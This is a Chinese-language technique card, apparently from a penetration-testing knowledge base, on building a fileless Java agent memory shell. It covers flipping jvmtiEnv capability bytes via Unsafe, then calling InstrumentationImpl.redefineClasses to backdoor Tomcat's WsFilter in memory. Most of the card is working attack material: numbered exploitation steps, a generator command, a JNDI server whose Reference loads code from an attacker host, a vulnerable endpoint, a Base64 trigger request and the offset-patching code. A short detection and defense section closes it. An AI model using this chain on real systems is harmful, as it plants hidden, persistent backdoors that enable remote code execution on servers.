---
id: web-java-classloader-fileless-agent-memshell-jvmti-can-redefine-patch
title: 无文件落地 Agent 内存马：远程类加载注入器改 jvmtiEnv 的 can_redefine_classes，用 InstrumentationImpl.redefineClasses 内存替换宿主类
type: scenario
domain: web
path: web/java/classloader
technique: fileless-agent-memshell-jvmti-can-redefine-classes-patch
aliases:
- FilelessAgentMemShell
- AgentMemShell
- 无文件 Agent 内存马
- can_redefine_classes
- jvmtiEnv 偏移 377/361/369
- Unsafe.putByte jvmtiEnv
- InstrumentationImpl.redefineClasses
tags:
- java
- jvm
- instrumentation
- jvmti
- agent
- memshell
- fileless
- unsafe
- jndi
- deserialization
- tomcat
cve: []
severity: critical
confidence: medium
status: verified
created: '2026-11-12'
updated: '2026-11-12'
verification:
  verified_by: verifier-V629
  verified_at: '2026-11-12T23:26:53+08:00'
  notes: 已对照 content.md 与全部 8 张截图核对：图01 WsFilter.class、图02 生成器输出（ifBeyondJDK8:false、os:Windows、ifUseTemplatesImpl:false、Unsafe 警告）、图03 计算器、图04 ClassFormatError、图05 attempted to delete a method、图06 attempted to add a method、图07 JDK11 illegal reflective access、图08 InstrumentationImpl(long,boolean,boolean)；jvmtiEnv 偏移 +377/+361/+369 置 2、JNDI Reference 投递、Base64 jndi 触发与原文逐行一致。生成类内部实现原文未公开，卡内已按描述标注为等价整理（confidence medium）。未验证点：未运行 FilelessAgentMemshellGenerator.jar 与 PoC 复现。dedup 候选 jndi-tomcat-filter-memshell（defineClass+FilterDef）、attach-api-jvmti-agent、deser-attach-agent 均非同链，保留。
---

## 一句话结论

在目标具备“动态代码上下文执行能力”（JNDI 注入、反序列化等能执行多行代码的入口）时，可用生成器把 `org.apache.tomcat.websocket.server.WsFilter` 等宿主类改写成插入恶意逻辑的新字节码，并生成一个自包含的 `AgentMemShell` 类；该类经 JNDI `Reference` 从远程 HTTP 加载后在目标 JVM 内用 `Unsafe` 把 `jvmtiEnv` 偏移处的 `can_redefine_classes` 置 2，再直接构造/调用 `sun.instrument.InstrumentationImpl.redefineClasses0` 用新字节码替换宿主类——全程不落地 agent jar 或任何文件，访问任意 URL 即触发内存马逻辑。

## 原理

- **常规 Agent 内存马的落盘瓶颈**：标准做法要用 `VirtualMachine.attach` + `loadAgent(agent.jar)`，agent jar 必须先落到目标机磁盘（MANIFEST 声明 `Agent-Class`、`Can-Redefine-Classes` 等）；反序列化/JNDI 场景往往只能执行一段内存代码，没有方便的文件落地点。
- **无文件思路**：`Instrumentation` 能力本质上来自 JVM 内部的 `jvmtiEnv*`。生成器产出的 `AgentMemShell` 类不装载 jar，而是在当前进程内取得 `jvmtiEnv` 指针，用 `sun.misc.Unsafe` 直接改其内存：`unsafe.putByte(native_jvmtienv + 377, (byte)2)`、`+361`、`+369` 都写 2（64 位目标），把默认值为 0 的 `can_redefine_classes` 能力位打开；随后构造 `sun.instrument.InstrumentationImpl(long jvmtiEnv, boolean isRetransformClassesSupported, boolean isRedefineClassesSupported)` 并调用 `redefineClasses`，实现对已加载类的字节码替换。不同 JDK 大版本偏移不同，向多个候选偏移都写 2 可兼容。
- **宿主类改写**：先用 Javassist 对宿主类（本例 `WsFilter.doFilter`）`insertBefore("Runtime.getRuntime().exec(\"calc\");")` 生成新 class，再交给生成器与目标类名、OS、位数等参数组合，产出最终用于替换的 `AgentMemShell.class`；`redefineClasses` 只允许改方法体/常量池，插桩必须在原方法体内完成。
- **投递方式**：JNDI 服务器把 `Reference("AgentMemShell","AgentMemShell","http://attacker:8000/")` 绑定到 RMI/LDAP 对象上，目标执行 `InitialContext.lookup("rmi://...")` 时按 Reference 的工厂地址从攻击者 HTTP 服务加载并实例化 AgentMemShell 类，构造/静态代码在目标 JVM 内执行上述注入逻辑。反序列化入口（如 `TemplatesImpl`）同样可作为代码执行载体。
- **为什么危险**：文件系统上没有任何新增 jar/class，静态查杀看不到；类定义只在内存中，重启才消失；宿主类选在请求必经路径（Filter/Valve）上时任意 URL 都可触发后门逻辑。
- **兼容性与边界**：原文环境 Windows 10 + JDK8u66 + SpringBoot2 实测成功；生成器有 `ifBeyondJDK8` 开关；JDK11 下反射访问 `InstrumentationImpl` 会出现 illegal reflective access 警告并可能因构造器签名/模块访问失败，JDK17 起完全禁止不安全反射，该手法失效。要求注入代码与目标 JVM 同进程；目标若禁用 Unsafe/模块封装严格（JDK 高版本）或 RASP 监控 `redefineClasses`，会失败。

## 触发条件

- 目标存在可执行多行代码的入口：JNDI 注入（远程 codebase 可用）、反序列化 gadget（TemplatesImpl 等），仅有单条命令执行（如 Runtime.exec 原语）不够。
- 目标 JVM 为 JDK8（原文 Windows 10 + JDK8u66；JDK9+ 需处理模块/反射限制，JDK17+ 不可用）。
- 宿主类已加载且 `isModifiableClass` 为真，方法体内可插入恶意逻辑且不违反 Instrument API 的“只改方法体”约束（宿主类不能含 lambda，见关联卡）。
- 攻击者可让目标从远程 HTTP 加载 AgentMemShell.class（JNDI Reference 或等价类加载链）。

## 利用步骤

1. 用 Javassist 改写宿主类（推荐 `org.apache.tomcat.websocket.server.WsFilter.doFilter`，无 lambda、类体积小），在方法体前插入恶意逻辑，`writeFile()` 得到新 class。
2. 用无文件 Agent 生成器合成最终类，例如：
   `java -jar FilelessAgentMemshellGenerator.jar -b 64 -c "org.apache.tomcat.websocket.server.WsFilter" -i false -o "Windows" -p .\WsFilter.class -t false`，产物为 `out/AgentMemShell.class`（控制台会提示 `sun.misc.Unsafe` 内部 API 警告，属预期）。
3. 部署 JNDI 服务器：启动 RMI/LDAP 服务，`Reference refObj = new Reference("AgentMemShell","AgentMemShell","http://attacker:8000/"); initialContext.rebind("rmi://attacker:11451/remoteObj", refObj);`，并用 `python -m http.server 8000` 提供 AgentMemShell.class。
4. 通过漏洞触发 `InitialContext.lookup("rmi://attacker:11451/remoteObj")`（如 `/jndi?b=<base64(url)>`）。
5. 访问任意不存在的路径，宿主类方法执行插入的代码（原文弹出计算器），确认内存马生效且目标磁盘无新文件。

## PoC

JNDI 服务器（原文）：

```java
import javax.naming.InitialContext;
import javax.naming.Reference;

public class JNDIServer {
    public static void main(String[] args) throws Exception {
        InitialContext initialContext = new InitialContext();
        Reference refObj = new Reference("AgentMemShell", "AgentMemShell", "http://localhost:8000/");
        initialContext.rebind("rmi://localhost:11451/remoteObj", refObj);
    }
}
```

漏洞触发点（原文测试环境）：

```java
@GetMapping({"/jndi"})
public void jndi(@RequestParam String b) throws Exception {
    byte[] decodedBytes = Base64.getDecoder().decode(b);
    String decodedUrl = new String(decodedBytes, StandardCharsets.UTF_8);
    new InitialContext().lookup(decodedUrl);
}
```

请求示例（b 为 `rmi://localhost:11451/remoteObj` 的 Base64）：

```http
GET /memShell/jndi?b=cm1pOi8vbG9jYWxob3N0OjExNDUxL3JlbW90ZU9iag== HTTP/1.1
Host: localhost:8080
```

关键无文件逻辑的核心（生成类内等价操作，原文代码未公开，按文章描述整理）：

```java
sun.misc.Unsafe unsafe = /* 反射取 theUnsafe */;
long native_jvmtienv = /* 取得当前 JVM 的 jvmtiEnv 指针 */;
unsafe.putByte(native_jvmtienv + 377, (byte) 2);  // 64 位候选偏移之一
unsafe.putByte(native_jvmtienv + 361, (byte) 2);
unsafe.putByte(native_jvmtienv + 369, (byte) 2);  // 打开 can_redefine_classes
// 构造 InstrumentationImpl 并 redefineClasses(宿主类, 新字节码)
```

## 变体与关联

- 投递变体：反序列化链（TemplatesImpl/translet）同样可执行注入类；但整包字节码+shellcode 体积大，GET/请求头型反序列化入口有长度限制，可用 UnicastRef/LDAPAttribute 链开启新的反序列化入口或压缩宿主类。
- JDK 变体：Windows 上 JDK8 用 `sun.tools.attach.WindowsVirtualMachine`，JDK9+ 类名变为 `VirtualMachineImpl`；JDK11 有 illegal reflective access 警告，JDK17 禁止不安全反射。
- 对照：落地 agent jar 的传统做法见 [[web-java-classloader-deser-attach-agent-filterchain-memshell]]（Attach API + loadAgent + agentmain）、[[web-java-classloader-agentmain-filterchain-dynamic-servletregistration]]、[[web-java-classloader-agent-asm-framework-filter-memshell]]；纯 shellcode 注入见 [[pentest-c2-java-tools-jar-windowsvirtualmachine-enqueue-shellcode]]。
- 宿主类选择的坑见 [[web-java-classloader-agent-redefine-lambda-expression-host-class]]（lambda 会导致 redefineClasses 报错）。

## 检测与防御

- 检测：JNDI/LDAP/RMI 出站与远程 codebase 的 HTTP 类加载（`Reference` 工厂指向外部 URL）；监控 `sun.misc.Unsafe`、`InstrumentationImpl`、`redefineClasses` 调用与对 `jvmtiEnv` 的内存写；内存马扫描（Shell-Analyzer、java-memshell-scanner、Arthas vmtool）比对磁盘 class 与 JVM 已加载类，查找无对应文件的组件。
- 防御：升级 JDK17+ 并开启强封装；JNDI 关闭远程 codebase（`com.sun.jndi.ldap.object.trustURLCodebase=false` 等）；反序列化入口白名单/过滤；RASP 监控 `redefineClasses` 与 Unsafe；限制 Web 进程出站。
- 加固：定期做 JVM 内存马排查；对应用进程开启安全管理与审计；不使用旧版 JDK8u66 等存在已知风险的版本。
